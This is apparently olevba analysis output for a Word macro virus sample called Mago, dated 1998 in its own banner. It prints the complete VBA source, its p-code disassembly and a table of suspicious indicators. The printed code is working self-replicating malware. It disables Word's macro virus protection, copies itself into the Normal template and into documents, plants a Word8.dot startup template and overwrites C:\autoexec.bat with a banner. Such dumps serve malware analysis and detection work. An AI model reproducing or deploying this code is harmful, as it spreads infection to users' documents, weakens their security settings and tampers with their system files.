olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mago
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mago - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MAGIA.bas 
in file: ./Virus.MSWord.Mago - OLE stream: 'Macros/VBA/MAGIA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("MAGIA").Export "c:\magrip.sys"
Call Ekeko
If UCase(Dir(Application.StartupPath & "\Word8.dot")) <> "WORD8.DOT" Then
Documents.Add Template:="", NewTemplate:=False
Open "c:\WinMG32.sys" For Output As 1
Print #1, "Attribute VB_Name = ""WinMG32"""
Print #1, "Sub FileSave()"
Print #1, "On Error Resume Next"
Print #1, "If NormalTemplate.VBProject.VBComponents.Item(""MAGIA"").Name <> ""MAGIA"" Then"
Print #1, "NormalTemplate.VBProject.VBComponents.Import ""c:\magrip.sys"""
Print #1, "End If"
Print #1, "ActiveDocument.Save"
Print #1, "End Sub"
Close 1
ActiveDocument.VBProject.VBComponents.Import "c:\WinMG32.sys"
ActiveDocument.SaveAs FileName:=Application.StartupPath & "\Word8.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
Windows("Word8.dot").Close
End If
End Sub

Sub AutoOpen()
Dim Set1 As Long
On Error Resume Next
Call huayco
Set1 = &H0
Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
Application.VBE.ActiveVBProject.VBComponents.Item("MAGIA").Export "c:\magrip.sys"
Call Ekeko
End Sub
Sub tutu()
Dim Set1 As Long
Dim WN, WD As Boolean
On Error Resume Next
Call huayco
Set1 = &H0
Options.VirusProtection = False
System.ProfileString("Options", "EnableMacroVirusProtection") = "0"
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
Application.VBE.ActiveVBProject.VBComponents.Item("MAGIA").Export "c:\magrip.sys"
WD = True
WN = True
If UCase(NormalTemplate.VBProject.VBComponents.Item("MAGIA").Name) <> "MAGIA" Then
WN = False
End If
If UCase(ActiveDocument.VBProject.VBComponents.Item("MAGIA").Name) <> "MAGIA" Then
WD = False
End If
If WN = False Then
NormalTemplate.VBProject.VBComponents.Import "c:\magrip.sys"
NormalTemplate.Save
End If
If WD = False Then
ActiveDocument.VBProject.VBComponents.Import "c:\magrip.sys"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
Call Ekeko
End Sub
Sub AutoExit()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("MAGIA").Export "c:\magrip.sys"
Call tutu
Call AutoExec
End Sub
Sub FileSave()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("MAGIA").Export "c:\magrip.sys"
Call tutu
Call AutoExec
ActiveDocument.Save
End Sub
Sub AutoClose()
On Error Resume Next
Application.VBE.ActiveVBProject.VBComponents.Item("MAGIA").Export "c:\magrip.sys"
Call tutu
Call AutoExec
End Sub
Sub Ekeko()
Yin = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Yin < 4 Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub" & vbCr & "Sub ViewVBCode()" & vbCr & "End Sub"
End If
End Sub
Sub huayco()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
ShowVisualBasicEditor = False
If day(date) = 19 Or second(time) = 25 Then
Documents.Add
ActiveWindow.View.FullScreen = True
Selection.Font.Name = "Copperplate Gothic Bold"
Selection.Font.Size = 48
Selection.Font.ColorIndex = wdRed
Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
Selection.TypeText Text:="A.G.R.I.P.I.N.A"
Selection.Font.ColorIndex = wdBlue
Selection.TypeParagraph
Selection.Font.Size = 36
Selection.TypeText Text:="MaG0 ViRu5"
Selection.TypeParagraph
Selection.Font.Size = 18
Selection.Font.ColorIndex = wdGreen
Selection.TypeText Text:="Chaclacayo - Perъ"
Selection.TypeParagraph
Selection.TypeText Text:="m25ry2@hotmail.com"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ActiveDocument.PrintOut
End If
If second(time) = 19 Or day(date) = 25 Then
Dim viejo, perk
viejo = "C:\autoexec.bat": perk = "C:\perk.bat"
Name viejo As perk
Open "c:\autoexec.bat" For Output As 1
Print #1, "@echo off"
Print #1, "cls"
Print #1, "echo *****************************************************************"
Print #1, "echo *                                                               *"
Print #1, "echo *                          MaG0 ViRu5                           *"
Print #1, "echo *                        A.G.R.I.P.I.N.A                        *"
Print #1, "echo *                       CHACLACAYO - PERU                       *"
Print #1, "echo *                          25-NOV-1998                          *"
Print #1, "echo *                          ARAWAK VIVE                          *"
Print #1, "echo *                   E-mail: m25ry2@hotmail.com                  *"
Print #1, "echo *                                                               *"
Print #1, "echo *****************************************************************"
Print #1, "pause"
Print #1, "perk.bat"
Close 1
End If
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mago
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/MAGIA - 8466 bytes
' Line #0:
' 	FuncDefn (Sub AutoExec())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x000D "c:\magrip.sys"
' 	LitStr 0x0005 "MAGIA"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #3:
' 	ArgsCall (Call) Ekeko 0x0000 
' Line #4:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\Word8.dot"
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0009 "WORD8.DOT"
' 	Ne 
' 	IfBlock 
' Line #5:
' 	LitStr 0x0000 ""
' 	ParamNamed Template 
' 	LitVarSpecial (False)
' 	ParamNamed NewTemplate 
' 	Ld Documents 
' 	ArgsMemCall Add 0x0002 
' Line #6:
' 	LitStr 0x000E "c:\WinMG32.sys"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #7:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "Attribute VB_Name = "WinMG32""
' 	PrintItemNL 
' Line #8:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "Sub FileSave()"
' 	PrintItemNL 
' Line #9:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "On Error Resume Next"
' 	PrintItemNL 
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004B "If NormalTemplate.VBProject.VBComponents.Item("MAGIA").Name <> "MAGIA" Then"
' 	PrintItemNL 
' Line #11:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x003C "NormalTemplate.VBProject.VBComponents.Import "c:\magrip.sys""
' 	PrintItemNL 
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "ActiveDocument.Save"
' 	PrintItemNL 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #16:
' 	LitStr 0x000E "c:\WinMG32.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #17:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000A "\Word8.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #18:
' 	LitStr 0x0009 "Word8.dot"
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0000 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	EndSub 
' Line #21:
' Line #22:
' 	FuncDefn (Sub AutoOpen())
' Line #23:
' 	Dim 
' 	VarDefn Set1 (As Long)
' Line #24:
' 	OnError (Resume Next) 
' Line #25:
' 	ArgsCall (Call) huayco 0x0000 
' Line #26:
' 	LitHI2 0x0000 
' 	St Set1 
' Line #27:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #28:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #29:
' 	LitStr 0x000D "c:\magrip.sys"
' 	LitStr 0x0005 "MAGIA"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #30:
' 	ArgsCall (Call) Ekeko 0x0000 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub tutu())
' Line #33:
' 	Dim 
' 	VarDefn Set1 (As Long)
' Line #34:
' 	Dim 
' 	VarDefn WN
' 	VarDefn WD (As Boolean)
' Line #35:
' 	OnError (Resume Next) 
' Line #36:
' 	ArgsCall (Call) huayco 0x0000 
' Line #37:
' 	LitHI2 0x0000 
' 	St Set1 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #39:
' 	LitStr 0x0001 "0"
' 	LitStr 0x0007 "Options"
' 	LitStr 0x001A "EnableMacroVirusProtection"
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #40:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #41:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #42:
' 	LitStr 0x000D "c:\magrip.sys"
' 	LitStr 0x0005 "MAGIA"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #43:
' 	LitVarSpecial (True)
' 	St WD 
' Line #44:
' 	LitVarSpecial (True)
' 	St WN 
' Line #45:
' 	LitStr 0x0005 "MAGIA"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "MAGIA"
' 	Ne 
' 	IfBlock 
' Line #46:
' 	LitVarSpecial (False)
' 	St WN 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	LitStr 0x0005 "MAGIA"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "MAGIA"
' 	Ne 
' 	IfBlock 
' Line #49:
' 	LitVarSpecial (False)
' 	St WD 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld WN 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #52:
' 	LitStr 0x000D "c:\magrip.sys"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #53:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Ld WD 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #56:
' 	LitStr 0x000D "c:\magrip.sys"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	ArgsCall (Call) Ekeko 0x0000 
' Line #60:
' 	EndSub 
' Line #61:
' 	FuncDefn (Sub AutoExit())
' Line #62:
' 	OnError (Resume Next) 
' Line #63:
' 	LitStr 0x000D "c:\magrip.sys"
' 	LitStr 0x0005 "MAGIA"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #64:
' 	ArgsCall (Call) tutu 0x0000 
' Line #65:
' 	ArgsCall (Call) AutoExec 0x0000 
' Line #66:
' 	EndSub 
' Line #67:
' 	FuncDefn (Sub FileSave())
' Line #68:
' 	OnError (Resume Next) 
' Line #69:
' 	LitStr 0x000D "c:\magrip.sys"
' 	LitStr 0x0005 "MAGIA"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #70:
' 	ArgsCall (Call) tutu 0x0000 
' Line #71:
' 	ArgsCall (Call) AutoExec 0x0000 
' Line #72:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #73:
' 	EndSub 
' Line #74:
' 	FuncDefn (Sub AutoClose())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	LitStr 0x000D "c:\magrip.sys"
' 	LitStr 0x0005 "MAGIA"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #77:
' 	ArgsCall (Call) tutu 0x0000 
' Line #78:
' 	ArgsCall (Call) AutoExec 0x0000 
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub Ekeko())
' Line #81:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Yin 
' Line #82:
' 	Ld Yin 
' 	LitDI2 0x0004 
' 	Lt 
' 	IfBlock 
' Line #83:
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0013 "Sub FileTemplates()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	EndSub 
' Line #86:
' 	FuncDefn (Sub huayco())
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #89:
' 	LitVarSpecial (False)
' 	St ShowVisualBasicEditor 
' Line #90:
' 	Ld Date 
' 	ArgsLd day 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	Ld time 
' 	ArgsLd second 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #91:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #92:
' 	LitVarSpecial (True)
' 	Ld ActiveWindow 
' 	MemLd View 
' 	MemSt FullScreen 
' Line #93:
' 	LitStr 0x0017 "Copperplate Gothic Bold"
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt New 
' Line #94:
' 	LitDI2 0x0030 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #95:
' 	Ld wdRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #96:
' 	Ld wdAlignParagraphCenter 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #97:
' 	LitStr 0x000F "A.G.R.I.P.I.N.A"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #98:
' 	Ld wdBlue 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #99:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #100:
' 	LitDI2 0x0024 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #101:
' 	LitStr 0x000A "MaG0 ViRu5"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #102:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #103:
' 	LitDI2 0x0012 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #104:
' 	Ld wdGreen 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #105:
' 	LitStr 0x0011 "Chaclacayo - Perъ"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #106:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #107:
' 	LitStr 0x0012 "m25ry2@hotmail.com"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #108:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #109:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #110:
' 	EndIfBlock 
' Line #111:
' 	Ld time 
' 	ArgsLd second 0x0001 
' 	LitDI2 0x0013 
' 	Eq 
' 	Ld Date 
' 	ArgsLd day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #112:
' 	Dim 
' 	VarDefn viejo
' 	VarDefn perk
' Line #113:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	St viejo 
' 	BoS 0x0000 
' 	LitStr 0x000B "C:\perk.bat"
' 	St perk 
' Line #114:
' 	Ld viejo 
' 	Ld perk 
' 	Name 
' Line #115:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *****************************************************************"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *                                                               *"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *                          MaG0 ViRu5                           *"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *                        A.G.R.I.P.I.N.A                        *"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *                       CHACLACAYO - PERU                       *"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *                          25-NOV-1998                          *"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *                          ARAWAK VIVE                          *"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *                   E-mail: m25ry2@hotmail.com                  *"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *                                                               *"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0046 "echo *****************************************************************"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "pause"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "perk.bat"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndSub 
' Line #133:
' Line #134:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |perk.bat            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

